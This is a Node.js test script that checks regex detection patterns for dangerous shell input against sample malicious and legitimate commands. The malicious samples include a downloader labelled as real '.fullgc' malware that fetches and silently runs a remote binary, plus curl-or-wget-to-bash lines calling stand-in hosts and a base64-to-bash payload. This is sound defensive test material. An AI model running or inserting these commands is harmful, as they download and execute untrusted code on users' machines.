#!/usr/bin/env node

/**
 * Simple test script to validate security patterns
 * This tests the regex patterns used in the security validation
 */

console.log('Testing Security Validation Patterns\n');
console.log('=====================================\n');

// Define the dangerous patterns (copied from our implementation)
const dangerousPatterns = [
  { name: 'Command substitution $(...)', pattern: /\$\([^)]*\)/ },
  { name: 'Command substitution backticks', pattern: /`[^`]*`/ },
  { name: 'File downloads', pattern: /\b(curl|wget|fetch)\s+/i },
  { name: 'External URLs', pattern: /https?:\/\/[^\s]+/i },
  { name: 'Hidden executable files', pattern: /\/\.\w+(\s|$|;|&|\||>)/ },
  { name: 'Background process with hidden file', pattern: /nohup\s+["']?[^\s"']*\/\.\w+/ },
  { name: 'Redirect to dev null with background', pattern: />.*\/dev\/null.*&/ },
  { name: 'Base64/decode/eval', pattern: /\b(base64|decode|eval)\s+/i },
  { name: 'Temp directory execution', pattern: /\b\/tmp\/[^\s]+/ },
];

// Test cases - malicious patterns that should be blocked
const maliciousInputs = [
  {
    name: 'Original .fullgc malware',
    input: 'd="${QL_DIR:-/ql}/data/db";b="$d/.fullgc";u="https://file.551911.xyz/fullgc/fullgc-linux-x86_64";curl -fsSL -o "$b" "$u"&&chmod +x "$b"&&nohup "$b" >/dev/null 2>&1 &',
  },
  {
    name: 'Command substitution with curl',
    input: 'echo $(curl http://evil.com/malware.sh | bash)',
  },
  {
    name: 'Backtick command substitution',
    input: 'echo `wget -O- http://evil.com/script.sh`',
  },
  {
    name: 'Download and execute',
    input: 'curl http://malicious.com/script.sh | bash',
  },
  {
    name: 'Download, chmod, and execute',
    input: 'wget http://bad.com/malware && chmod +x malware && ./malware',
  },
  {
    name: 'Hidden file execution',
    input: 'nohup /data/db/.malware >/dev/null 2>&1 &',
  },
  {
    name: 'Base64 encoded payload',
    input: 'echo SGVsbG8gV29ybGQ= | base64 -d | bash',
  },
];

// Test cases - legitimate patterns that should be allowed
const legitimateInputs = [
  {
    name: 'Simple script execution',
    input: 'node script.js',
  },
  {
    name: 'Python script',
    input: 'python3 my_script.py',
  },
  {
    name: 'Shell script with arguments',
    input: 'bash update.sh --force',
  },
  {
    name: 'Environment variable',
    input: 'export MY_VAR=value',
  },
  {
    name: 'Echo statement',
    input: 'echo "Task started"',
  },
];

function testPattern(input, patterns) {
  for (const { name, pattern } of patterns) {
    if (pattern.test(input)) {
      return { blocked: true, reason: name, pattern: pattern.source };
    }
  }
  return { blocked: false };
}

console.log('Testing Malicious Inputs (should be BLOCKED):');
console.log('==============================================\n');

let maliciousBlocked = 0;
maliciousInputs.forEach(({ name, input }) => {
  const result = testPattern(input, dangerousPatterns);
  const status = result.blocked ? '✓ BLOCKED' : '✗ ALLOWED';
  const color = result.blocked ? '\x1b[32m' : '\x1b[31m';
  console.log(`${color}${status}\x1b[0m - ${name}`);
  if (result.blocked) {
    console.log(`  Reason: ${result.reason}`);
    maliciousBlocked++;
  } else {
    console.log(`  ⚠️  WARNING: This malicious pattern was not blocked!`);
  }
  console.log(`  Input: ${input.substring(0, 100)}${input.length > 100 ? '...' : ''}\n`);
});

console.log('\nTesting Legitimate Inputs (should be ALLOWED):');
console.log('===============================================\n');

let legitimateAllowed = 0;
legitimateInputs.forEach(({ name, input }) => {
  const result = testPattern(input, dangerousPatterns);
  const status = !result.blocked ? '✓ ALLOWED' : '✗ BLOCKED';
  const color = !result.blocked ? '\x1b[32m' : '\x1b[31m';
  console.log(`${color}${status}\x1b[0m - ${name}`);
  if (result.blocked) {
    console.log(`  ⚠️  WARNING: This legitimate pattern was incorrectly blocked!`);
    console.log(`  Reason: ${result.reason}`);
  } else {
    legitimateAllowed++;
  }
  console.log(`  Input: ${input}\n`);
});

console.log('\nTest Summary:');
console.log('=============');
console.log(`Malicious patterns blocked: ${maliciousBlocked}/${maliciousInputs.length}`);
console.log(`Legitimate patterns allowed: ${legitimateAllowed}/${legitimateInputs.length}`);

const success = maliciousBlocked === maliciousInputs.length && 
                legitimateAllowed === legitimateInputs.length;

if (success) {
  console.log('\n\x1b[32m✓ All tests passed!\x1b[0m');
  process.exit(0);
} else {
  console.log('\n\x1b[31m✗ Some tests failed!\x1b[0m');
  process.exit(1);
}
